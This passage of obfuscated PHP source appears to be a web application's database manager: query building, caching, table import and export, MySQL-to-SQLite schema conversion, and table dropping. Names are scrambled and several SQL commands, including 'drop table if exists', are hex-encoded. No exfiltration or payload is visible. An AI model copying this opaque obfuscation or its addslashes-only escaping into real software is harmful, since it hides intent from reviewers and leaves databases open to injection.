$Ö»¨¸ª¨[$¹Ï±ŸÈ›[370]]; $ñêÖå¨‹ = $¹Ï±ŸÈ›[1108] . $this->parseTable($Ö»¨¸ª¨[$¹Ï±ŸÈ›[368]]) . $this->parseWhere(!empty($Ö»¨¸ª¨[$¹Ï±ŸÈ›[364]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[364]] : $¹Ï±ŸÈ›[22]) . $this->parseOrder(!empty($Ö»¨¸ª¨[$¹Ï±ŸÈ›[453]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[453]] : $¹Ï±ŸÈ›[22]) . $this->parseLimit(!empty($Ö»¨¸ª¨[$¹Ï±ŸÈ›[379]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[379]] : $¹Ï±ŸÈ›[22]) . $this->parseLock(isset($Ö»¨¸ª¨[$¹Ï±ŸÈ›[910]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[910]] : !1) . $this->parseComment(!empty($Ö»¨¸ª¨[$¹Ï±ŸÈ›[441]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[441]] : $¹Ï±ŸÈ›[22]); return $this->execute($ñêÖå¨‹, $this->parseBind(!empty($Ö»¨¸ª¨[$¹Ï±ŸÈ›[372]]) ? $Ö»¨¸ª¨[$¹Ï±ŸÈ›[372]] : array())); } public function select($¯Ë­Ç›‚ = array()) { $î¶Å¼ =& $_SERVER[ü¢ÙÊñÛ]; $this->model = $¯Ë­Ç›‚[$î¶Å¼[370]]; $Öè„¤ß = $this->buildSelectSql($¯Ë­Ç›‚); $Ñš›¢«Ÿ = isset($¯Ë­Ç›‚[$î¶Å¼[436]]) ? $¯Ë­Ç›‚[$î¶Å¼[436]] : !1; if ($Ñš›¢«Ÿ) { $ÂÁÃò• = is_string($Ñš›¢«Ÿ[$î¶Å¼[108]]) ? $Ñš›¢«Ÿ[$î¶Å¼[108]] : $î¶Å¼[1109] . md5($Öè„¤ß); $¤ì³´ıÂ = think_cache($ÂÁÃò•, $î¶Å¼[22], $Ñš›¢«Ÿ); if (!1 !== $¤ì³´ıÂ) { return $¤ì³´ıÂ; } } $áåé¼™´ = $this->query($Öè„¤ß, $this->parseBind(!empty($¯Ë­Ç›‚[$î¶Å¼[372]]) ? $¯Ë­Ç›‚[$î¶Å¼[372]] : array())); if ($Ñš›¢«Ÿ && !1 !== $áåé¼™´) { think_cache($ÂÁÃò•, $áåé¼™´, $Ñš›¢«Ÿ); } return $áåé¼™´; } public function buildSelectSql($‚ˆ­ÁÉ = array()) { $ã¦¬öî× =& $_SERVER[ü¢ÙÊñÛ]; if (isset($‚ˆ­ÁÉ[$ã¦¬öî×[440]])) { if (strpos($‚ˆ­ÁÉ[$ã¦¬öî×[440]], $ã¦¬öî×[60])) { list($ˆâãÖ, $¢ª×éÇú) = explode($ã¦¬öî×[60], $‚ˆ­ÁÉ[$ã¦¬öî×[440]]); } else { $ˆâãÖ = $‚ˆ­ÁÉ[$ã¦¬öî×[440]]; } $ˆâãÖ = $ˆâãÖ ? $ˆâãÖ : 1; $¢ª×éÇú = isset($¢ª×éÇú) ? $¢ª×éÇú : (is_numeric($‚ˆ­ÁÉ[$ã¦¬öî×[379]]) ? $‚ˆ­ÁÉ[$ã¦¬öî×[379]] : 20); $ÌßıÉ€² = $¢ª×éÇú * ((int) $ˆâãÖ - 1); $‚ˆ­ÁÉ[$ã¦¬öî×[379]] = $ÌßıÉ€² . $ã¦¬öî×[60] . $¢ª×éÇú; } if (think_config($ã¦¬öî×[1110])) { $÷µƒˆôÃ = $ã¦¬öî×[1111] . md5(serialize($‚ˆ­ÁÉ)); $»‘Ş´¦„ = think_cache($÷µƒˆôÃ); if ($»‘Ş´¦„) { return $»‘Ş´¦„; } } $™Ïàû¹ = $this->parseSql($this->selectSql, $‚ˆ­ÁÉ); $™Ïàû¹ .= $this->parseLock(isset($‚ˆ­ÁÉ[$ã¦¬öî×[910]]) ? $‚ˆ­ÁÉ[$ã¦¬öî×[910]] : !1); if (isset($÷µƒˆôÃ)) { think_cache($÷µƒˆôÃ, $™Ïàû¹); } return $™Ïàû¹; } public function parseSql($¿¡… À, $€‹Ñ¤« = array()) { $¢î·ÎíØ =& $_SERVER[ü¢ÙÊñÛ]; $¿¡… À = str_replace(array($¢î·ÎíØ[1112], $¢î·ÎíØ[1113], $¢î·ÎíØ[1114], $¢î·ÎíØ[1115], $¢î·ÎíØ[1116], $¢î·ÎíØ[1117], $¢î·ÎíØ[1118], $¢î·ÎíØ[1119], $¢î·ÎíØ[1120], $¢î·ÎíØ[1121], $¢î·ÎíØ[1122]), array($this->parseTable("{$€‹Ñ¤«[$¢î·ÎíØ[368]]}"), $this->parseDistinct(isset($€‹Ñ¤«[$¢î·ÎíØ[1123]]) ? $€‹Ñ¤«[$¢î·ÎíØ[1123]] : !1), $this->parseField(!empty($€‹Ñ¤«[$¢î·ÎíØ[362]]) ? $€‹Ñ¤«[$¢î·ÎíØ[362]] : $¢î·ÎíØ[233]), $this->parseJoin(!empty($€‹Ñ¤«[$¢î·ÎíØ[371]]) ? $€‹Ñ¤«[$¢î·ÎíØ[371]] : $¢î·ÎíØ[22]), $this->parseWhere(!empty($€‹Ñ¤«[$¢î·ÎíØ[364]]) ? $€‹Ñ¤«[$¢î·ÎíØ[364]] : $¢î·ÎíØ[22]), $this->parseGroup(!empty($€‹Ñ¤«[$¢î·ÎíØ[589]]) ? $€‹Ñ¤«[$¢î·ÎíØ[589]] : $¢î·ÎíØ[22]), $this->parseHaving(!empty($€‹Ñ¤«[$¢î·ÎíØ[1124]]) ? $€‹Ñ¤«[$¢î·ÎíØ[1124]] : $¢î·ÎíØ[22]), $this->parseOrder(!empty($€‹Ñ¤«[$¢î·ÎíØ[453]]) ? $€‹Ñ¤«[$¢î·ÎíØ[453]] : $¢î·ÎíØ[22]), $this->parseLimit(!empty($€‹Ñ¤«[$¢î·ÎíØ[379]]) ? $€‹Ñ¤«[$¢î·ÎíØ[379]] : $¢î·ÎíØ[22]), $this->parseUnion(!empty($€‹Ñ¤«[$¢î·ÎíØ[434]]) ? $€‹Ñ¤«[$¢î·ÎíØ[434]] : $¢î·ÎíØ[22]), $this->parseComment(!empty($€‹Ñ¤«[$¢î·ÎíØ[441]]) ? $€‹Ñ¤«[$¢î·ÎíØ[441]] : $¢î·ÎíØ[22])), $¿¡… À); return $¿¡… À; } public function getLastSql($ìáÂµÈ = '') { return $ìáÂµÈ ? $this->modelSql[$ìáÂµÈ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($´†—²Ğı) { return addslashes($´†—²Ğı); } public function setModel($ßâÂÉÕ) { $this->model = $ßâÂÉÕ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($§†ùÙšï = array()) { $¤íÜ’ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($§†ùÙšï)) { $§†ùÙšï = $GLOBALS[$¤íÜ’[16]][$¤íÜ’[31]]; } $this->database = $§†ùÙšï; } public function model($××óØ — = '') { return new ModelBase($××óØ —, $_SERVER[ü¢ÙÊñÛ][22], $this->database); } public function db($ÕÀæÊ¼· = false) { $Òìü™« =& $_SERVER[ü¢ÙÊñÛ]; $÷ĞæµÜ = array_change_key_case($this->database); if ($this->dbType() == $Òìü™«[23] || !$ÕÀæÊ¼·) { return $this->model()->db(); } $òòˆ„Íß = $÷ĞæµÜ[$Òìü™«[1038]]; $÷ĞæµÜ[$Òìü™«[1038]] = $Òìü™«[22]; if ($÷ĞæµÜ[$Òìü™«[1033]] == $Òìü™«[1030]) { $şü¡šúÛ = $÷ĞæµÜ[$Òìü™«[1039]]; $÷ĞæµÜ[$Òìü™«[1039]] = substr($şü¡šúÛ, 0, strrpos($şü¡šúÛ, $Òìü™«[1125])); } $this->database = $÷ĞæµÜ; $¡ÀØŞ‚à = $this->model()->db(); try { $ÒØÁú = $¡ÀØŞ‚à->execute("\163\150\x6f\167\40\144\x61\x74\x61\x62\141\x73\145\163\x20\x6c\x69\x6b\145\x20\47{$òòˆ„Íß}\x27"); } catch (Exception $ñ©ß€Œ‚) { } if (!$ÒØÁú) { $¡ÀØŞ‚à->execute("\x63\x72\x65\141\164\145\x20\144\x61\164\x61\x62\x61\163\145\40\x60{$òòˆ„Íß}\x60"); } $÷ĞæµÜ[$Òìü™«[1038]] = $òòˆ„Íß; if ($÷ĞæµÜ[$Òìü™«[1033]] == $Òìü™«[1030]) { $÷ĞæµÜ[$Òìü™«[1039]] .= $Òìü™«[1125] . $òòˆ„Íß; } $this->database = $÷ĞæµÜ; $¡ÀØŞ‚à->execute("\x75\163\x65\40\x60{$òòˆ„Íß}\140"); return $¡ÀØŞ‚à; } public function createTable($ ‡ÁúÎ¶, &$¼÷Ì££ö) { $€ş±Áéí =& $_SERVER[ü¢ÙÊñÛ]; if (!IO::exist($ ‡ÁúÎ¶)) { ActionCall($€ş±Áéí[1126], !0, 0); show_json(LNG($€ş±Áéí[1127]), !1); } $¯ó×š»ª = $this->model()->db(); $š“§Ÿ¶Æ = sqlSplit(IO::getContent($ ‡ÁúÎ¶)); foreach ($š“§Ÿ¶Æ as $Î€£‚±) { $şèíÕË» = stripos($Î€£‚±, $€ş±Áéí[1128]) === 0; if ($şèíÕË») { $¼÷Ì££ö->task[$€ş±Áéí[1129]] += 1; } $¯ó×š»ª->execute($Î€£‚±); if ($şèíÕË») { preg_match($€ş±Áéí[1130], $Î€£‚±, $ã¬ß®„å); $¼÷Ì££ö->task[$€ş±Áéí[1131]] = $ã¬ß®„å[1]; $¼÷Ì££ö->update(1); } } } public function insertTable($åÔıì÷°, &$ÏˆÜ©‹Â) { $»å†Î°Ì =& $_SERVER[ü¢ÙÊñÛ]; $ÈÏò©’Ã = $this->model()->db(); $»¾ùÑ»Í = $²­Ö¨Ä ? array($²­Ö¨Ä) : $ÈÏò©’Ã->getTables(); foreach ($åÔıì÷° as $•ï„ü§) { $²­Ö¨Ä = basename($•ï„ü§, $»å†Î°Ì[854]); if (!in_array($²­Ö¨Ä, $»¾ùÑ»Í)) { continue; } $ÏˆÜ©‹Â->task[$»å†Î°Ì[1131]] = $²­Ö¨Ä; if (get_filesize($•ï„ü§) == 0) { continue; } $éó±úöó = $this->sqlToDb($•ï„ü§, $ÏˆÜ©‹Â); if (!$éó±úöó) { ActionCall($»å†Î°Ì[1126], !0, 0); show_json(LNG($»å†Î°Ì[1132]) . "\x5b{$²­Ö¨Ä}\x5d", !1); } } } public function sqlFromDb($ÓÌ†÷ê‹, $’ù™î©, &$–Ä‰ÓÄº, $«ÄÖúİš = '') { if ($–Ä‰ÓÄº) { $–Ä‰ÓÄº->task[$_SERVER[ü¢ÙÊñÛ][1131]] = $ÓÌ†÷ê‹; } $Â…ßŠ˜Ê = $this->model($ÓÌ†÷ê‹); $ÂëÄ²ô˜ = 0; $±•‚Ú‰ò = 0; $©ÊÁöıö = 10000; $¥¯İÃ”Ğ = fopen($’ù™î©, $_SERVER[ü¢ÙÊñÛ][1133]); $åã—ë© = $Â…ßŠ˜Ê->getPk(); $Ê¡Ã›„‡ = $Â…ßŠ˜Ê->getDbFields(); $¯À·ÂâÚ = $_SERVER[ü¢ÙÊñÛ][22]; if ($GLOBALS[$_SERVER[ü¢ÙÊñÛ][853]] && in_array($ÓÌ†÷ê‹, array($_SERVER[ü¢ÙÊñÛ][1134], $_SERVER[ü¢ÙÊñÛ][1135]))) { $¯À·ÂâÚ = $ÓÌ†÷ê‹; } do { $ÄÆñ™‘ù = array($åã—ë© => array($_SERVER[ü¢ÙÊñÛ][1080], $±•‚Ú‰ò)); $ÅÕÍÕèà = $Â…ßŠ˜Ê->where($ÄÆñ™‘ù)->field($Ê¡Ã›„‡)->order($åã—ë© . $_SERVER[ü¢ÙÊñÛ][1136])->limit($©ÊÁöıö)->select(); $ÅÕÍÕèà = !empty($ÅÕÍÕèà) ? $ÅÕÍÕèà : array(); if (!($‰¶ÄâÍ™ = count($ÅÕÍÕèà))) { break; } $èòëø‚° = end($ÅÕÍÕèà); $±•‚Ú‰ò = $èòëø‚°[$åã—ë©]; $›ö’¶Ë = array(); foreach ($ÅÕÍÕèà as $œˆ¬ú„) { if ($¯À·ÂâÚ) { if ($ÓÌ†÷ê‹ == $_SERVER[ü¢ÙÊñÛ][1134]) { if ($œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][43]] == $_SERVER[ü¢ÙÊñÛ][1137]) { $šÃıâßË = json_decode($œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][462]], !0); if ($šÃıâßË[$_SERVER[ü¢ÙÊñÛ][42]] == $GLOBALS[$_SERVER[ü¢ÙÊñÛ][853]] && $šÃıâßË[$_SERVER[ü¢ÙÊñÛ][815]] != 1) { continue; } } } else { if ($œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][43]] == $_SERVER[ü¢ÙÊñÛ][1138] && $œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][108]] == $_SERVER[ü¢ÙÊñÛ][848]) { continue; } } } if ($«ÄÖúİš) { $œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][98]] = "\x7b\x69\x6f\x3a{$«ÄÖúİš}\x7d" . substr($œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][98]], strlen("\173\151\x6f\72{$œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][883]]}\x7d")); $œˆ¬ú„[$_SERVER[ü¢ÙÊñÛ][883]] = $«ÄÖúİš; } $›ö’¶Ë[] = $_SERVER[ü¢ÙÊñÛ][1139] . $this->sqlEncode($œˆ¬ú„) . $_SERVER[ü¢ÙÊñÛ][1140]; } $Â­ÊİØĞ = "\111\116\x53\105\122\124\40\111\x4e\x54\117\x20\x60{$ÓÌ†÷ê‹}\x60\40\x28\140" . implode($_SERVER[ü¢ÙÊñÛ][1141], $Ê¡Ã›„‡) . $_SERVER[ü¢ÙÊñÛ][1142]; fwrite($¥¯İÃ”Ğ, $Â­ÊİØĞ . implode($_SERVER[ü¢ÙÊñÛ][1143], $›ö’¶Ë) . $_SERVER[ü¢ÙÊñÛ][85] . PHP_EOL); $ÂëÄ²ô˜ += $‰¶ÄâÍ™; if ($–Ä‰ÓÄº) { $–Ä‰ÓÄº->update($‰¶ÄâÍ™); } } while ($©ÊÁöıö == $‰¶ÄâÍ™); fclose($¥¯İÃ”Ğ); return $ÂëÄ²ô˜; } public function sqlToDb($ı€û¡ÕÛ, &$á½õ¶‹) { $¬·Á‘î„ =& $_SERVER[ü¢ÙÊñÛ]; $Ø²ğ† = $this->model()->db(); $Œıâ‹æŒ = @fopen($ı€û¡ÕÛ, $¬·Á‘î„[1144]); if (!$Œıâ‹æŒ) { return !1; } $¢Úà¾¯ö = 0; $Ìœ«©¯ = $¬·Á‘î„[22]; $¯Øıë¾ = array(); $¥æ¬¥±š = $this->dbType(); $ÇÜ•§Ç¤ = $¥æ¬¥±š == $¬·Á‘î„[23] ? 500 : 2000; $Î˜±»„Ó = basename($ı€û¡ÕÛ, $¬·Á‘î„[854]); $áûÃö” = 0; $ÙÓÙì£¤ = 4194304; while (!feof($Œıâ‹æŒ)) { $²ƒÎÊïß = trim(fgets($Œıâ‹æŒ)); if (!$²ƒÎÊïß) { continue; } $¼ùø£º = $this->sqlDecode($²ƒÎÊïß, $¥æ¬¥±š, $Î˜±»„Ó); if (stripos($¼ùø£º, $¬·Á‘î„[442]) === 0) { if (!$Ìœ«©¯) { $Ìœ«©¯ = $¼ùø£º . $¬·Á‘î„[63]; } continue; } if ($á½õ¶‹) { $á½õ¶‹->task[$¬·Á‘î„[1129]] += 1; } $¢Úà¾¯ö++; $¯Øıë¾[] = rtrim(rtrim(trim($¼ùø£º), $¬·Á‘î„[60]), $¬·Á‘î„[85]); $ŠÆËõâà = null; $âœ à = strlen($¼ùø£º); $áûÃö” += $âœ à; $Ë¢â…˜ = strlen($Ìœ«©¯) + $áûÃö” + (count($¯Øıë¾) - 1); if ($Ë¢â…˜ >= $ÙÓÙì£¤) { $ŠÆËõâà = array_pop($¯Øıë¾); if ($¢Úà¾¯ö > 1) { $¢Úà¾¯ö--; } } if ($¢Úà¾¯ö >= $ÇÜ•§Ç¤ || $ŠÆËõâà) { $¼ùø£º = $Ìœ«©¯ . implode($¬·Á‘î„[60], $¯Øıë¾); if (!$Ø²ğ†->execute($¼ùø£º)) { return !1; } if ($á½õ¶‹) { $á½õ¶‹->update($¢Úà¾¯ö); } $¯Øıë¾ = array(); $¢Úà¾¯ö = 0; $áûÃö” = 0; if ($ŠÆËõâà) { $¯Øıë¾ = array($ŠÆËõâà); $¢Úà¾¯ö = 1; $áûÃö” = $âœ à; } } } fclose($Œıâ‹æŒ); if (!empty($¯Øıë¾)) { $¼ùø£º = $Ìœ«©¯ . implode($¬·Á‘î„[60], $¯Øıë¾); if (!$Ø²ğ†->execute($¼ùø£º)) { return !1; } if ($á½õ¶‹) { $á½õ¶‹->update($¢Úà¾¯ö); } } return !0; } public function dropTable($È•´Ñü¹ = null) { $ÛÅìà· = $this->model()->db(); $“çñ£ß¢ = $È•´Ñü¹ ? array($È•´Ñü¹) : $ÛÅìà·->getTables(); if (!$“çñ£ß¢) { return; } foreach ($“çñ£ß¢ as $È•´Ñü¹) { if ($È•´Ñü¹) { $È•´Ñü¹ = strtolower($È•´Ñü¹); } else { continue; } $ÛÅìà·->execute("\144\x72\157\160\x20\164\x61\142\x6c\145\40\151\146\x20\145\170\x69\x73\x74\x73\40\x60{$È•´Ñü¹}\x60"); } } private function sqlEncode($ßÑ‘¸îº) { $üĞÕ®šµ =& $_SERVER[ü¢ÙÊñÛ]; $¦ä¨É›¾ = array(); foreach ($ßÑ‘¸îº as $Èô¢ì„¯) { if (is_array($Èô¢ì„¯)) { $Èô¢ì„¯ = json_encode_force($Èô¢ì„¯); } $Èô¢ì„¯ = addslashes($Èô¢ì„¯); $Èô¢ì„¯ = str_replace(array($üĞÕ®šµ[1145], $üĞÕ®šµ[10], $üĞÕ®šµ[429]), array($üĞÕ®šµ[1146], $üĞÕ®šµ[1147], $üĞÕ®šµ[1148]), $Èô¢ì„¯); $¦ä¨É›¾[] = $Èô¢ì„¯; } return $üĞÕ®šµ[69] . implode($üĞÕ®šµ[1149], $¦ä¨É›¾) . $üĞÕ®šµ[69]; } private function sqlDecode($¸¹©Úà”, $ûØ•’û, $œšÔÆ‡ = '') { $‘ÚÒôíó =& $_SERVER[ü¢ÙÊñÛ]; $¸¹©Úà” = str_replace(array($‘ÚÒôíó[1146], $‘ÚÒôíó[1147], $‘ÚÒôíó[1148]), array($‘ÚÒôíó[1145], $‘ÚÒôíó[10], $‘ÚÒôíó[429]), $¸¹©Úà”); if ($ûØ•’û == $‘ÚÒôíó[23]) { $¸¹©Úà” = str_ireplace($‘ÚÒôíó[1150], $‘ÚÒôíó[70], $¸¹©Úà”); $¸¹©Úà” = stripslashes($¸¹©Úà”); } return preg_replace($‘ÚÒôíó[1151], $‘ÚÒôíó[22], $¸¹©Úà”); if ($ûØ•’û == $‘ÚÒôíó[23]) { return $œšÔÆ‡ != $‘ÚÒôíó[847] ? stripslashes($¸¹©Úà”) : $¸¹©Úà”; } if ($œšÔÆ‡ == $‘ÚÒôíó[847]) { $¸¹©Úà” = str_replace($‘ÚÒôíó[1152], $‘ÚÒôíó[132], stripslashes($¸¹©Úà”)); } return $¸¹©Úà”; } public function getSqlFile($ÁÏùƒ¤í = '') { $Î¨ñ›´ =& $_SERVER[ü¢ÙÊñÛ]; $ÃÁš€¼× = $this->dbType(!0); $Ûà§áûÉ = CONTROLLER_DIR . "\x69\156\163\x74\x61\154\154\57\x64\141\164\141\x2f{$ÃÁš€¼×}\56\x73\x71\x6c"; $ìŠã“ÜÁ = file_get_contents($Ûà§áûÉ); $–çî»Ş· = $Î¨ñ›´[1153] . ($ÃÁš€¼× == $Î¨ñ›´[870] ? $Î¨ñ›´[1154] : $Î¨ñ›´[1155]) . $Î¨ñ›´[1156]; preg_match_all($–çî»Ş·, $ìŠã“ÜÁ, $±ˆŸéù¤); $Ç“ÎõëÀ = $±ˆŸéù¤[1]; $½Œ¥Ğäï = $this->model()->db(); $”¥•Å½ = $½Œ¥Ğäï->getTables(); $òğÃ×¦ = TEMP_FILES . $Î¨ñ›´[1157] . date($Î¨ñ›´[272]) . $Î¨ñ›´[18]; del_dir($òğÃ×¦); mk_dir($òğÃ×¦); $äé°¹Ğ = $òğÃ×¦ . $Î¨ñ›´[1158]; $äÇŠ¹ï½ = $òğÃ×¦ . $Î¨ñ›´[1159]; $àäÒÕ§Í = $ÃÁš€¼× == $Î¨ñ›´[23] ? $Î¨ñ›´[870] : $Î¨ñ›´[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\x6c\x6c\57\x64\x61\164\141\57{$àäÒÕ§Í}\56\x73\x71\x6c", $òğÃ×¦); @touch($òğÃ×¦ . $ÃÁš€¼× . $Î¨ñ›´[854]); $’ğ×ëœÍ = fopen($äé°¹Ğ, $Î¨ñ›´[1133]); $¤Òƒ‘Ø» = fopen($äÇŠ¹ï½, $Î¨ñ›´[1133]); if ($ÃÁš€¼× == $Î¨ñ›´[23]) { $”¥•Å½ = array_diff($”¥•Å½, array($Î¨ñ›´[845], $Î¨ñ›´[846])); $éİŠ–²è = array($Î¨ñ›´[1160], $Î¨ñ›´[1161], $Î¨ñ›´[1162]); fwrite($¤Òƒ‘Ø», implode(PHP_EOL, $éİŠ–²è) . PHP_EOL . PHP_EOL); foreach ($”¥•Å½ as $î©Ûåù) { $õí†½øç = $this->sqlFromSqlite($î©Ûåù); if (!$õí†½øç[$Î¨ñ›´[23]]) { continue; } fwrite($¤Òƒ‘Ø», $õí†½øç[$Î¨ñ›´[23]] . PHP_EOL . PHP_EOL); if (!in_array($î©Ûåù, $Ç“ÎõëÀ)) { fwrite($’ğ×ëœÍ, $õí†½øç[$Î¨ñ›´[870]] . PHP_EOL . PHP_EOL); } } } else { foreach ($”¥•Å½ as $î©Ûåù) { $õí†½øç = $this->sqlFromMysql($î©Ûåù); if (!$õí†½øç[$Î¨ñ›´[870]]) { continue; } fwrite($’ğ×ëœÍ, $õí†½øç[$Î¨ñ›´[870]] . PHP_EOL . PHP_EOL); if (!in_array($î©Ûåù, $Ç“ÎõëÀ)) { fwrite($¤Òƒ‘Ø», $õí†½øç[$Î¨ñ›´[23]] . PHP_EOL . PHP_EOL); } } } fclose($’ğ×ëœÍ); fclose($¤Òƒ‘Ø»); $ìŠã“ÜÁ = array($Î¨ñ›´[870] => $äé°¹Ğ, $Î¨ñ›´[23] => $äÇŠ¹ï½); return $ÁÏùƒ¤í ? $ìŠã“ÜÁ[$ÁÏùƒ¤í] : $ìŠã“ÜÁ; } public function dbType($òÜ¥À»Ë = false) { $¥ëÂÚÌĞ =& $_SERVER[ü¢ÙÊñÛ]; $öäïÓ²ı = $òÜ¥À»Ë ? $GLOBALS[$¥ëÂÚÌĞ[16]][$¥ëÂÚÌĞ[31]] : $this->database; $öäïÓ²ı = array_change_key_case($öäïÓ²ı); $ˆïø¬‰¯ = $öäïÓ²ı[$¥ëÂÚÌĞ[1033]]; if ($ˆïø¬‰¯ == $¥ëÂÚÌĞ[1030]) { $ÊÉÇ‰ä = explode($¥ëÂÚÌĞ[14], $öäïÓ²ı[$¥ëÂÚÌĞ[1039]]); $ˆïø¬‰¯ = $ÊÉÇ‰ä[0]; } $€Õ¥ß = array($¥ëÂÚÌĞ[1163] => $¥ëÂÚÌĞ[23], $¥ëÂÚÌĞ[978] => $¥ëÂÚÌĞ[870]); if (isset($€Õ¥ß[$ˆïø¬‰¯])) { $ˆïø¬‰¯ = $€Õ¥ß[$ˆïø¬‰¯]; } return $ˆïø¬‰¯; } public function sqlFromMysql($Ãç‘ØÕ, $·ğŒµÚµ = '') { $èÊë¸¤è =& $_SERVER[ü¢ÙÊñÛ]; $¿’‡§åÑ = $this->model()->db(); $•ìƒÆº = $¿’‡§åÑ->query($èÊë¸¤è[1164] . $Ãç‘ØÕ . $èÊë¸¤è[472]); if (!$•ìƒÆº || !$•ìƒÆº[0]) { return !1; } $³« Şµ = _get($•ìƒÆº[0], $èÊë¸¤è[1165], $èÊë¸¤è[22]); if (!$³« Şµ) { return !1; } $Ö½¾ú© = "\104\122\117\x50\40\124\x41\102\x4c\x45\40\111\106\x20\105\130\111\x53\x54\123\x20\140{$Ãç‘ØÕ}\140\x3b" . PHP_EOL . $³« Şµ . $èÊë¸¤è[85]; if ($·ğŒµÚµ && $·ğŒµÚµ == $èÊë¸¤è[870]) { return $Ö½¾ú©; } $­ê­ê¡ = array_change_key_case($GLOBALS[$èÊë¸¤è[16]][$èÊë¸¤è[31]]); $…•òîó– = $­ê­ê¡[$èÊë¸¤è[1038]]; $ßë©•®ğ = $èÊë¸¤è[1166] . $…•òîó– . $èÊë¸¤è[1167] . $Ãç‘ØÕ . $èÊë¸¤è[69]; $ÖÖ°Í€Ñ = $èÊë¸¤è[1168] . $Ãç‘ØÕ . $èÊë¸¤è[966]; $°ïÍŒ ø = $¿’‡§åÑ->query($ßë©•®ğ); if (empty($°ïÍŒ ø)) { $ø£…ŞşÅ = array($èÊë¸¤è[870] => $èÊë¸¤è[22], $èÊë¸¤è[23] => $èÊë¸¤è[22]); return $·ğŒµÚµ ? $ø£…ŞşÅ[$·ğŒµÚµ] : $ø£…ŞşÅ; } $°‚ŞÜÔ‚ = $¿’‡§åÑ->query($ÖÖ°Í€Ñ); $Ôåõ— = $èÊë¸¤è[22]; $‚ê±É® = array(); foreach ($°‚ŞÜÔ‚ as $ØÆÔÇÖé) { if (!$Ôåõ— && $ØÆÔÇÖé[$èÊë¸¤è[1169]] == $èÊë¸¤è[1170]) { $Ôåõ— = $ØÆÔÇÖé[$èÊë¸¤è[1171]]; } if (isset($‚ê±É®[$ØÆÔÇÖé[$èÊë¸¤è[1169]]])) { $‚ê±É®[$ØÆÔÇÖé[$èÊë¸¤è[1169]]][$èÊë¸¤è[1172]][] = $ØÆÔÇÖé[$èÊë¸¤è[1171]]; continue; } $‚ê±É®[$ØÆÔÇÖé[$èÊë¸¤è[1169]]] = array($èÊë¸¤è[1173] => $ØÆÔÇÖé[$èÊë¸¤è[1169]], $èÊë¸¤è[1172] => array($ØÆÔÇÖé[$èÊë¸¤è[1171]]), $èÊë¸¤è[1174] => $ØÆÔÇÖé[$èÊë¸¤è[1175]] == $èÊë¸¤è[102] ? 0 : 1); } $Ó˜¸©£ = array(); foreach ($‚ê±É® as $ØÆÔÇÖé) { $ŒÉ˜˜°Ø = $ØÆÔÇÖé[$èÊë¸¤è[1173]] == $èÊë¸¤è[1170]; $«„¼ºÕ = array($èÊë¸¤è[1176], $ØÆÔÇÖé[$èÊë¸¤è[1174]] == $èÊë¸¤è[102] && !$ŒÉ˜˜°Ø ? $èÊë¸¤è[1177] : $èÊë¸¤è[22], $èÊë¸¤è[1178], $èÊë¸¤è[1179] . $Ãç‘ØÕ . $èÊë¸¤è[21] . ($ŒÉ˜˜°Ø ? $èÊë¸¤è[1180] : $ØÆÔÇÖé[$èÊë¸¤è[1173]]) . $èÊë¸¤è[132], $èÊë¸¤è[1181], $èÊë¸¤è[132] . $Ãç‘ØÕ . $èÊë¸¤è[132], $èÊë¸¤è[1182] . implode($èÊë¸¤è[1183], $ØÆÔÇÖé[$èÊë¸¤è[1172]]) . $èÊë¸¤è[1184]); $Ó˜¸©£[] = implode($èÊë¸¤è[63], $«„¼ºÕ) . $èÊë¸¤è[85]; } $¾‘ë—÷ë = array(); $ğ±¬ÁÂÎ = array($èÊë¸¤è[1185] => $èÊë¸¤è[1186], $èÊë¸¤è[1186] => $èÊë¸¤è[1186], $èÊë¸¤è[375] => $èÊë¸¤è[402], $èÊë¸¤è[374] => $èÊë¸¤è[402]); foreach ($°ïÍŒ ø as $ØÆÔÇÖé) { $«„¼ºÕ = array($èÊë¸¤è[132] . $ØÆÔÇÖé[$èÊë¸¤è[1187]] . $èÊë¸¤è[132], isset($ğ±¬ÁÂÎ[$ØÆÔÇÖé[$èÊë¸¤è[1188]]]) ? $ğ±¬ÁÂÎ[$ØÆÔÇÖé[$èÊë¸¤è[1188]]] : $ØÆÔÇÖé[$èÊë¸¤è[1189]], $ØÆÔÇÖé[$èÊë¸¤è[1190]] == $èÊë¸¤è[964] ? $èÊë¸¤è[1191] : $èÊë¸¤è[1192], $ØÆÔÇÖé[$èÊë¸¤è[1187]] == $Ôåõ— ? $èÊë¸¤è[1193] : $èÊë¸¤è[22], $ØÆÔÇÖé[$èÊë¸¤è[1015]] ? strtoupper(str_replace($èÊë¸¤è[21], $èÊë¸¤è[22], $ØÆÔÇÖé[$èÊë¸¤è[1015]])) : $èÊë¸¤è[22]); $¾‘ë—÷ë[] = trim(implode($èÊë¸¤è[63], $«„¼ºÕ)); } $™Å×·àÆ = array($èÊë¸¤è[1194] . $Ãç‘ØÕ . $èÊë¸¤è[1195], $èÊë¸¤è[1196] . $Ãç‘ØÕ . $èÊë¸¤è[1197], implode($èÊë¸¤è[60] . PHP_EOL, $¾‘ë—÷ë), $èÊë¸¤è[1012]); $×‰‘Æ»Ï = implode(PHP_EOL, array_merge($™Å×·àÆ, $Ó˜¸©£)); if ($·ğŒµÚµ && $·ğŒµÚµ == $èÊë¸¤è[23]) { return $×‰‘Æ»Ï; } $ø£…ŞşÅ = array($èÊë¸¤è[870] => $Ö½¾ú©, $èÊë¸¤è[23] => $×‰‘Æ»Ï); return $·ğŒµÚµ ? $ø£…ŞşÅ[$·ğŒµÚµ] : $ø£…ŞşÅ; } public function sqlFromSqlite($«íåÑ¢È, $‰Ş’şïì = '') { 